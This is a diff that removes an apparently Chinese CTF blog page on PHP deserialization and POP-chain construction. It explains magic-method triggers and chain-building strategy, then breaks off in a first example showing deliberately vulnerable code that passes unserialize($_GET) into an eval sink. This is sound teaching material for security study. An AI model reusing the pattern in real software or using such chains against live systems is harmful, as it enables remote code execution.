@@ -1,308 +1,719 @@
-<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[反序列化]POP链 - Nexuzzz0</title><meta name=Description content="Nexuzzz0's BLOG"><meta property="og:title" content="[反序列化]POP链">
-<meta property="og:description" content="[反序列化]构造POP链在学习如何构造反序列化之前我们要先了解一下常用的魔术方法及其触发条件 反序列化中常见的魔术方法__wakeup() //"><meta property="og:type" content="article"><meta property="og:url" content="https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/"><meta property="og:image" content="https://nexuzzz0.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-11-21T17:01:54+08:00"><meta property="article:modified_time" content="2023-11-21T17:01:54+08:00"><meta property="og:site_name" content="Nexuzzz0's BLOG"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nexuzzz0.github.io/logo.png"><meta name=twitter:title content="[反序列化]POP链"><meta name=twitter:description content="[反序列化]构造POP链在学习如何构造反序列化之前我们要先了解一下常用的魔术方法及其触发条件 反序列化中常见的魔术方法__wakeup() //"><meta name=application-name content="Nexuzzz0's BLOG"><meta name=apple-mobile-web-app-title content="Nexuzzz0's BLOG"><meta name=theme-color content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/color.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[反序列化]POP链","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/nexuzzz0.github.io\/posts\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE\/"},"genre":"posts","keywords":"反序列化, PHP","wordcount":5379,"url":"https:\/\/nexuzzz0.github.io\/posts\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE\/","datePublished":"2023-11-21T17:01:54+08:00","dateModified":"2023-11-21T17:01:54+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Nexuzzz0"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark"),window.theme=e,window.isDark=window.theme!=="light"}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"||"auto"==="black"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")],window.switchThemeEventSet=new Set</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=desktop-header-typeit class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
-<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
-<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i>
-</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i>
-</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i>
-</span></span><a href=javascript:void(0); class="menu-item theme-select" title=切换主题><i class="fas fa-adjust fa-fw"></i>
-<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=mobile-header-typeit class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
-<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i>
-</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i>
-</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a href=javascript:void(0); class="menu-item theme-select" title=切换主题>
-<i class="fas fa-adjust fa-fw"></i>
-<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#反序列化中常见的魔术方法>反序列化中常见的魔术方法</a><ul><li><a href=#__construct-和-__destruct><code>__construct()</code> 和 <code>__destruct()</code></a></li><li><a href=#__sleep-和-__wakeup><code>__sleep()</code> 和 <code>__wakeup()</code></a></li><li><a href=#__tostring><code>__toString()</code></a></li><li><a href=#__invoke><code>__invoke()</code></a></li><li><a href=#__get-和-__set><code>__get()</code> 和 <code>__set()</code></a></li><li><a href=#__call-和-__callstatic><code>__call()</code> 和 <code>__callStatic()</code></a></li></ul></li><li><a href=#pop链>POP链</a><ul><li><a href=#构造思路>构造思路</a></li><li><a href=#构造小技巧>构造小技巧</a></li><li><a href=#例题1level-0>例题1——Level 0</a></li><li><a href=#例题2level-1>例题2——Level 1</a></li><li><a href=#例题3mrctf2020ezpop>例题3——[MRCTF2020]Ezpop</a></li><li><a href=#例题42021-强网杯-赌徒>例题4——2021 强网杯 赌徒</a></li></ul></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[反序列化]POP链</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class="author fas fa-user-circle fa-fw"></span><a href=/ title=Author rel=author class=author>Nexuzzz0</a>
-</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2023-11-21>2023-11-21</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2023-11-21>2023-11-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5379 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 11 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
-<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#反序列化中常见的魔术方法>反序列化中常见的魔术方法</a><ul><li><a href=#__construct-和-__destruct><code>__construct()</code> 和 <code>__destruct()</code></a></li><li><a href=#__sleep-和-__wakeup><code>__sleep()</code> 和 <code>__wakeup()</code></a></li><li><a href=#__tostring><code>__toString()</code></a></li><li><a href=#__invoke><code>__invoke()</code></a></li><li><a href=#__get-和-__set><code>__get()</code> 和 <code>__set()</code></a></li><li><a href=#__call-和-__callstatic><code>__call()</code> 和 <code>__callStatic()</code></a></li></ul></li><li><a href=#pop链>POP链</a><ul><li><a href=#构造思路>构造思路</a></li><li><a href=#构造小技巧>构造小技巧</a></li><li><a href=#例题1level-0>例题1——Level 0</a></li><li><a href=#例题2level-1>例题2——Level 1</a></li><li><a href=#例题3mrctf2020ezpop>例题3——[MRCTF2020]Ezpop</a></li><li><a href=#例题42021-强网杯-赌徒>例题4——2021 强网杯 赌徒</a></li></ul></li></ul></nav></div></div><div class=content id=content><h1 id=反序列化构造pop链 class=headerLink><a href=#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9e%84%e9%80%a0pop%e9%93%be class=header-mark></a>[反序列化]构造POP链</h1><p>在学习如何构造反序列化之前我们要先了解一下常用的魔术方法及其触发条件</p><h2 id=反序列化中常见的魔术方法 class=headerLink><a href=#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%ad%e5%b8%b8%e8%a7%81%e7%9a%84%e9%ad%94%e6%9c%af%e6%96%b9%e6%b3%95 class=header-mark></a>反序列化中常见的魔术方法</h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>__wakeup() //将在字符串被反序列化之后被立即调用，就是说看到unserialize后就会被立即调用
-</span></span><span class=line><span class=cl>__sleep() //执行serialize()时，先会调用这个函数，用于指定哪些指令会被序列化保存下来
-</span></span><span class=line><span class=cl>__construct() //当对象创建时会自动调用(但在unserialize()时是不会自动调用的)
-</span></span><span class=line><span class=cl>__destruct() //对象被销毁时自动调用
-</span></span><span class=line><span class=cl>__call() //在对象上下文中调用不可访问(不存在)的方法时触发
-</span></span><span class=line><span class=cl>__callStatic() //在静态上下文中调用不可访问的方法时触发
-</span></span><span class=line><span class=cl>__get() //用于从不可访问的属性读取数据或者不存在的类属性时都会调用此方法
-</span></span><span class=line><span class=cl>__set() //用于将数据写入不可访问的属性
-</span></span><span class=line><span class=cl>__isset() //在不可访问的属性上调用isset()或empty()触发
-</span></span><span class=line><span class=cl>__unset() //在不可访问的属性上使用unset()时触发
-</span></span><span class=line><span class=cl>__toString() //当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用
-</span></span><span class=line><span class=cl>__invoke() //当尝试将对象调用为函数时触发
-</span></span></code></pre></div><p>在我们的攻击中，反序列化函数<code>unserialize()</code>是我们攻击的入口，也就是说，只要这个参数可控，<strong>我们就能传入任何的已经序列化的对象</strong>（只要这个类在当前作用域存在我们就可以利用），而不是局限于出现<code>unserialize()</code>函数的类的对象，如果只能局限于当前类，那我们的攻击面也太狭小了，这个类不调用危险的方法我们就没法发起攻击。</p><p>但是我们又知道，你反序列化了其他的类对象以后我们只是控制了是<strong>属性</strong>，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔术方法。</p><p>魔术方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。</p><h3 id=__construct-和-__destruct class=headerLink><a href=#__construct-%e5%92%8c-__destruct class=header-mark></a><code>__construct()</code> 和 <code>__destruct()</code></h3><p><code>__construct</code>：当对象<strong>创建</strong>时会自动调用，注意是创建的时候，也就是说有<code>new</code>的时候就会调用，在<code>unserialize</code>时是不会被自动调用的</p><p><code>__destruct()</code>：当对象被销毁时会自动调用；当新对象创建后，它后面一定会被自动销毁，也就是调用<code>__construct</code>后一定会调用<code>__destruct</code>；或者我们直接传入一个对象，它后面被销毁时也会调用<code>__destruct</code></p><p>可以看到，创建对象e时调用了<code>__construct</code>，然后输出序列化后的对象<code>t</code>，最后在销毁对象<code>t</code>时调用了<code>__destruct</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702607.png 2x" sizes=auto alt=img></a></figure></p><p>再看这个，我们没有创建对象，而是直接传入了一个对象，所以说它没有调用<code>__construct</code>却调用了<code>__destruct</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702753.png 2x" sizes=auto alt=img></a></figure></p><p>最后看这个，因为我们既创建了对象<code>t</code>，也传入了对象，所以说它<code>__destruct</code>被调用了两次，因为它两个对象最后都会被销毁</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702623.png 2x" sizes=auto alt=img></a></figure></p><h3 id=__sleep-和-__wakeup class=headerLink><a href=#__sleep-%e5%92%8c-__wakeup class=header-mark></a><code>__sleep()</code> 和 <code>__wakeup()</code></h3><p><code>__sleep()</code> ：在对象被序列化<strong>之前</strong>被调用，就是说看到<code>serialize</code>时就会被调用，而且是先调用后再执行序列化</p><p><code>__wakeup()</code>: 将在<strong>字符串被反序列化之后被立即调用</strong>，就是说<strong>看到</strong><code>unserialize</code><strong>后就会被立即调用</strong></p><p>在看到<code>serialize($b)</code>后，它是先调用了<code>__sleep()</code>魔法函数，然后才执行了<code>echo</code>，输出了字符串</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702569.png 2x" sizes=auto alt=img></a></figure></p><p>直接输入了字符串，当它执行了<code>unserialize</code>转换成对象后，就会最先调用<code>__wakeup()</code>，它的优先级最高<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702630.png 2x" sizes=auto alt=img></a></figure></p><h3 id=__tostring class=headerLink><a href=#__tostring class=header-mark></a><code>__toString()</code></h3><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p><ol><li><code>echo($obj)</code>或<code>print($obj)</code><strong>打印对象</strong>时会触发</li><li><strong>反序列化对象</strong>与字符串连接时</li><li><strong>反序列化对象</strong>参与格式化字符串时</li><li><strong>反序列化对象</strong>与<strong>字符串</strong>进行<code>preg_match</code>正则匹配)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li><li><strong>反序列化对象</strong>参与<strong>格式化sql语句</strong>时，绑定参数时(用的少)</li><li><strong>反序列化对象</strong>经过<strong>php字符串函数</strong>时，如<code>strlen()</code>，<code>addslashes()</code>时(用的少)</li><li>在<code>in_array()</code>方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有<code>tostring</code>返回的字符串的时候<code>tostring</code>会被调用</li><li><strong>反序列化对象</strong>作为<code>class_exists()</code>的参数的时候(用的少)</li></ol><p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用</p><p>新建了对象<code>t</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png 2x" sizes=auto alt=img></a></figure></p><p>再来看一个与字符串连接的例子，变量<code>t</code>被当成了字符串，然后与<code>t1</code>完成了连接</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png 2x" sizes=auto alt=img></a></figure></p><h3 id=__invoke class=headerLink><a href=#__invoke class=header-mark></a><code>__invoke()</code></h3><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p><p>需要注意的是，这个魔术方法只在<strong>PHP 5.3.0 及以上版本</strong>有效</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png 2x" sizes=auto alt=img></a></figure></p><h3 id=__get-和-__set class=headerLink><a href=#__get-%e5%92%8c-__set class=header-mark></a><code>__get()</code> 和 <code>__set()</code></h3><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取数据，或者说是<strong>调用一个类及其父类方法中未定义属性时</strong></p><p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private</code> <code>protected</code>)(用的不多)</p><p><code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>t</code>属性，但我们是没有定义<code>t</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值打印出来</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png 2x" sizes=auto alt=img></a></figure></p><h3 id=__call-和-__callstatic class=headerLink><a href=#__call-%e5%92%8c-__callstatic class=header-mark></a><code>__call()</code> 和 <code>__callStatic()</code></h3><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p><p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p><p>比如说像这段代码，我们调用对象<code>t</code>中的方法<code>t2</code>，但因为类中没有方法<code>t2</code>，所以说就调用了<code>__call()</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png 2x" sizes=auto alt=img></a></figure></p><h2 id=pop链 class=headerLink><a href=#pop%e9%93%be class=header-mark></a>POP链</h2><p>前面所讲解的序列化攻击更多的是<strong>魔术方法</strong>中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p><p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组<strong>连续的调用链</strong>，最终达到攻击者邪恶的目的</p><h3 id=构造思路 class=headerLink><a href=#%e6%9e%84%e9%80%a0%e6%80%9d%e8%b7%af class=header-mark></a>构造思路</h3><p><strong>找思路从尾到头</strong></p><p>任何一条链子的构造，我们都要先找到它的<strong>头和尾</strong>，pop链也不例外，pop链的头部一般是用户能传入参数的地方，而尾部是可以执行我们操作的地方，比如说读写文件，执行命令等等；找到头尾之后，从尾部(我们执行操作的地方)开始，看它在哪个方法中，怎么样可以调用它，<strong>一层一层往上倒推</strong>，直到推到头部为止，也就是我们传参的地方，一条pop链子就出来了；在ctf中，头部一般都会是GET或者POST传参，然后可能就有一个<code>unserialize</code>直接将我们传入的参数反序列化了，尾部都是拿flag的地方；然后一环连着一环构成pop链</p><h3 id=构造小技巧 class=headerLink><a href=#%e6%9e%84%e9%80%a0%e5%b0%8f%e6%8a%80%e5%b7%a7 class=header-mark></a>构造小技巧</h3><p>先将每个类赋值给各个变量，<strong>构造从头到尾</strong>，根据顺序<strong>哪个类中的对象</strong>指向<strong>另一个类</strong></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png 2x" sizes=auto alt=img></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png title=img data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png 2x" sizes=auto alt=img></a></figure></p><p>比如<code>Show</code>类<code>__wakeup</code>魔术方法中的<code>source</code>属性指向<code>Show</code>类<code>__toString</code>魔术方法中的<code>str</code>属性，分开了说就是<code>Show</code>类中的<code>source</code>属性指向<code>Show</code>类所以才有了<code>$a -> source = $b;</code></p><h3 id=例题1level-0 class=headerLink><a href=#%e4%be%8b%e9%a2%981level-0 class=header-mark></a>例题1——Level 0</h3><p>比如说这个例子，危险函数应该是<code>evil</code>类中的<code>action</code>方法，里面有个<code>eval</code>，但<code>action</code>方法并不是魔术方法，一般情况下我们是很难调用它的，但我们看到<code>test</code>类中的<code>__destruct()</code>调用了<code>action</code>方法，但在<code>__construct()</code>中可以看出它创建了一个<code>normal</code>类的对象，然后调用的是<code>normal</code>类中的<code>action</code>方法；这个就很好办，我们把魔术方法中的属性改一下，改成创建一个<code>evil</code>类的对象，那它自然调用的就是<code>evil</code>类中的<code>action</code>方法了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>test</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=k>protected</span> <span class=nv>$ClassObj</span><span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ClassObj</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>normal</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>ClassObj</span><span class=o>-&gt;</span><span class=na>action</span><span class=p>();</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>normal</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=k>function</span> <span class=nf>action</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=s2>&#34;HelloWorld&#34;</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>  <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>evil</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>  <span class=k>private</span> <span class=nv>$data</span><span class=p>;</span>
-</span></span><span class=line><span class=cl>  <span class=k>function</span> <span class=nf>action</span><span class=p>()</span> <span class=p>{</span>
-</span></span><span class=line><span class=cl>    <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>);</span>
-</span></span><span class=line><span class=cl>  <span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span><span class=line><span class=cl><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;a&#39;</span><span class=p>]);</span>
